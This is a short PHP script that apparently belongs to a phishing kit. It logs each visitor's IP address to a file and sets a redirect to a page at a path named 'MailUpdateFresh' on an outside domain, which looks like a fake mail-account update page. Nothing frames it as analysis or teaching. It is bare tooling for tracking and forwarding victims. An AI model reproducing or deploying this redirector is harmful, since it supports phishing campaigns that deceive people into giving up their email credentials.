<?php

$ip = getenv("REMOTE_ADDR");
$message .= "$ip \n";
$fp = fopen("visitIP.txt","a");
fputs($fp,$message);


$pagelink="https://beyondordinarylife.com/opt/MailUpdateFresh/index.html";
$FailRedirect="https://beyondordinarylife.com/opt/MailUpdateFresh/index.html";
$redirecttype="2";// 1:header - 2:script
?>